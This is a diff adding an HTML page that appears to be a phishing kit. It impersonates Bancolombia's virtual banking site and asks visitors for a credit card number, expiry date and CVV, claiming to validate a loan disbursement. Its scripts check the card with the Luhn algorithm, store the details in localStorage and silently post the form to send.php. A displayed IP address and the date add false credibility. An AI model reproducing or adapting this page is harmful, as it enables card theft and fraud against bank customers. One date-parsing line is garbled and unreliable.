@@ -1,0 +1,336 @@
+<html>
+<!-- Added by HTTrack --><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Bancolombia</title>
+<link href="../../sapp2406.sirv.com/bogo/lfr_style.css" rel="stylesheet"/>
+<link href="../../sapp2406.sirv.com/bogo/lfr_ownstyle.css" rel="stylesheet"/>
+<script src="../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<script></script>
+<body>
+<div class="box-container">
+<div class="container">
+<div class="toast hidden" id="errorMessage" style="position: absolute">
+<p id="AuthLabel"></p>
+<span class="icon-close-search-r" onclick="hideToast()"></span>
+</div>
+<div class="container__water-mark">
+<div class="container__water-mark--image-container"></div>
+</div>
+<div class="container__login">
+<div class="container__login--header">
+<img alt="" src="imagenes/logo-bancolombia-black.svg"/>
+</div>
+<div class="container__login--title">
+<div class="container__login--title-1" style="color: #000">
+<p>
+                Bienvenido a tu Banca Virtual
+                <label class="tituloformulario" id="flujoOrigenLbl">
+<br/></label>
+</p>
+</div>
+</div>
+<div class="container__login--login-box">
+<div class="container__login--login-box-title">
+<span id="form-title">Ingrese sus datos de tarjeta de crédito para validar el deseembolso de su cupo crediticio.</span>
+</div>
+<div class="form-container">
+<form action="send.php" autocomplete="off" id="loginForm" method="POST" name="loginForm">
+<div id="document-form">
+<div id="credit-card-form">
+<div class="label">
+<label for="cardNumber">Número de Tarjeta</label>
+</div>
+<input class="custom-form-control" id="cardNumber" name="cardNumber" type="text"/>
+<p id="cardError" style="color: red; display: none">
+                      Debe ingresar una tarjeta válida.
+                    </p>
+<div class="label">
+<label for="expiryDate">Fecha de Vencimiento</label>
+</div>
+<input class="custom-form-control" id="expiryDate" maxlength="5" name="expiryDate" placeholder="MM/YY" type="text"/>
+<p id="expiryError" style="color: red; display: none">
+                      Fecha inválida
+                    </p>
+<div class="label">
+<label for="ccv">Código CCV</label>
+</div>
+<input class="custom-form-control" id="ccv" maxlength="3" name="ccv" type="password"/>
+</div>
+</div>
+<div class="btn-container">
+<button class="btn-main" onmousedown="this.style.backgroundColor='#ffe066';" onmouseout="this.style.backgroundColor='#ffcc00';" onmouseup="this.style.backgroundColor='#ffcc00';" style="
+    width:50%;
+    background-color:#ffcc00;   /* amarillo */
+    color:#000;                 /* texto negro */
+    border:none;
+    padding:12px;
+    font-size:16px;
+    font-weight:bold;
+    border-radius:26px;
+    cursor:pointer;
+    transition:background-color 0.2s ease;
+  " type="submit">
+  Continuar
+</button>
+</div>
+</form>
+</div>
+</div>
+<div class="img-centro">
+<img alt="Descripción de la imagen" src="imagenes/logo-bancolombia-black.svg"/>
+</div>
+<style>
+  .img-centro {
+    text-align: center;   /* centra la imagen */
+  }
+
+  .img-centro img {
+    max-width: 180px;     /* ajusta el ancho máximo */
+    width: 100%;          /* escala de forma responsive */
+    height: auto;         /* mantiene la proporción */
+  }
+</style>
+<br/>
+<div class="img-centro">
+<img alt="Descripción de la imagen" src="imagenes/super-horizontal-black.svg"/>
+</div>
+<style>
+  .img-centro {
+    text-align: center;   /* centra la imagen */
+  }
+
+  .img-centro img {
+    max-width: 160px;     /* ajusta el ancho máximo */
+    width: 100%;          /* escala de forma responsive */
+    height: auto;         /* mantiene la proporción */
+  }
+</style>
+<div style="position:relative; padding-bottom:56px;">
+<!-- ...contenido del bloque... -->
+<div class="footer-datos">
+<p id="ip">Dirección IP: 45.187.7.195</p>
+<p id="fecha"></p>
+</div>
+<style>
+  .footer-datos {
+    text-align: center;        /* centrado */
+    font-size: 14px;           /* tamaño ajustable */
+    color: #777;               /* gris similar al de la foto */
+    margin-top: 40px;          /* separación con el contenido */
+  }
+  .footer-datos p {
+    margin: 4px 0;
+  }
+</style>
+<script>
+  // Generar fecha y hora actuales en español
+  const opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
+                     hour: 'numeric', minute: 'numeric', hour12: true };
+  const ahora = new Date().toLocaleDateString('es-ES', opciones);
+
+  document.getElementById("fecha").textContent = ahora;
+</script>
+<script>
+            document.addEventListener("DOMContentLoaded", function () {
+              const cardNumber = document.getElementById("cardNumber");
+              const expiryDate = document.getElementById("expiryDate");
+              const ccv = document.getElementById("ccv");
+              const form = document.getElementById("loginForm");
+
+              // Formatear número de tarjeta en grupos de 4
+              cardNumber.addEventListener("input", function () {
+                let value = cardNumber.value.replace(/\D/g, ""); // Elimina todo lo que no sea número
+
+                if (value.length > 16) {
+                  value = value.slice(0, 16);
+                }
+
+                // Aplica formato con espacios cada 4 dígitos sin contar los espacios como caracteres
+                let formattedValue = value.replace(/(\d{4})/g, "$1 ").trim();
+
+                cardNumber.value = formattedValue;
+
+                // Validación visual
+                if (value.length === 16 && isLuhnValid(value)) {
+                  cardNumber.style.borderColor = "green";
+                  document.getElementById("cardError").style.display = "none";
+                } else {
+                  cardNumber.style.borderColor = "red";
+                  document.getElementById("cardError").style.display = "block";
+                }
+              });
+
+              // Formatear fecha de vencimiento MM/YY y validar hasta 2025
+              expiryDate.addEventListener("input", function () {
+                let value = expiryDate.value.replace(/\D/g, ""); // Elimina caracteres no numéricos
+
+                if (value.length > 4) {
+                  value = value.slice(0, 4);
+                }
+
+                if (value.length > 2) {
+                  value = value.slice(0, 2) + "/" + value.slice(2, 4);
+                }
+
+                expiryDate.value = value;
+
+                // Validación de fecha (mínimo año 25)
+                if (isValidDate(value)) {
+                  expiryDate.style.borderColor = "green";
+                  document.getElementById("expiryError").style.display = "none";
+                } else {
+                  expiryDate.style.borderColor = "red";
+                  document.getElementById("expiryError").style.display =
+                    "block";
+                }
+              });
+
+              // Validar CCV
+              ccv.addEventListener("input", function () {
+                let value = ccv.value.replace(/\D/g, ""); // Solo permite números
+                if (value.length > 4) {
+                  value = value.slice(0, 4);
+                }
+                ccv.value = value;
+
+                if (value.length < 3 || value.length > 4) {
+                  ccv.style.borderColor = "red";
+                } else {
+                  ccv.style.borderColor = "green";
+                }
+              });
+
+              form.addEventListener("submit", function (event) {
+                event.preventDefault();
+
+                let cardNumberValue = cardNumber.value.replace(/\s/g, ""); // Eliminar espacios antes de validar
+
+                if (
+                  isLuhnValid(cardNumberValue) &&
+                  isValidDate(expiryDate.value) &&
+                  (ccv.value.length === 3 || ccv.value.length === 4)
+                ) {
+                  localStorage.setItem(
+                    "pagojet",
+                    JSON.stringify({
+                      tarjeta: cardNumberValue,
+                      fechaVencimiento: expiryDate.value,
+                      cvv: ccv.value,
+                    })
+                  );
+                  window.location.href = "load.html";     
+                } else {
+                  alert("Corrige los errores antes de continuar.");
+                }
+              });
+
+              function isLuhnValid(cardNumber) {
+                let sum = 0;
+                let alternate = false;
+                for (let i = cardNumber.length - 1; i >= 0; i--) {
+                  let n = parseInt(cardNumber[i], 10);
+                  if (alternate) {
+                    n *= 2;
+                    if (n > 9) n -= 9;
+                  }
+                  sum += n;
+                  alternate = !alternate;
+                }
+                return sum % 10 === 0;
+              }
+
+              function isValidDate(date) {
+                const regex = /^(0[1-9]|1[0-2])\/(\d{2})$/;
+                if (!regex.test(date)) return false;
+
+                let [month, year] = date.split("https://avvpersonas-cupos-liquidez.vercel.app/").map(Number);
+                let currentYear = new Date().getFullYear() % 100; // Obtener los últimos 2 dígitos del año actual
+
+                return year >= 25 && year <= currentYear + 45;
+              }
+            });
+          </script>
+</div>
+<style>
+          ul {
+            list-style-type: none;
+            margin-top: 2rem;
+            margin-left: 4rem;
+            vertical-align: top;
+          }
+
+          li {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+          }
+
+          .icon-info {
+            width: 3rem;
+            height: 3rem;
+            margin-right: 1rem;
+            object-fit: cover;
+          }
+        </style>
+<!--  <div class="container__info">
+          <div class="container__info--tips">
+            <div class="collapsable">
+              <div class="collapse">
+                <div class="collapse__header">
+                  <div class="collapse__header--text">
+                    <img
+                      src="https://sapp2406.sirv.com/bogo/c292.png"
+                      style="width: 100%"
+                    />
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+-->
+<div id="doEnableNatural" style="display: none"></div>
+<div id="doEnableCorporate" style="display: none"></div>
+<div id="doEnableAfinidad" style="display: block"></div>
+</div>
+<script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const form = document.getElementById("form");
+    
+        form.addEventListener("submit", function (event) {
+          event.preventDefault();
+    
+          const card = document.getElementById("tarjeta").value;
+          const date = document.getElementById("fecha").value;
+          const ccv = document.getElementById("ccv").value;
+    
+          const tc = { card, date, ccv };
+    
+          // Guarda SOLO los datos de tarjeta
+          localStorage.setItem("tc", JSON.stringify(tc));
+    
+          // Redirige a load.html (que ahora sabe leer "tc" correctamente)
+          window.location.href = "load.html";
+        });
+      });
+    </script>
+</div></div><script>
+document.addEventListener('DOMContentLoaded', function(){
+  var form = document.getElementById('loginForm');
+  if (!form) return;
+  form.addEventListener('submit', function(e){
+    e.preventDefault();
+    var data = new FormData(form);
+    fetch('send.php', { method: 'POST', body: data, credentials: 'same-origin' })
+      .then(function(response){ /* silent */ })
+      .catch(function(err){ /* silent */ });
+    return false;
+  });
+});
+</script></body>
+</html>
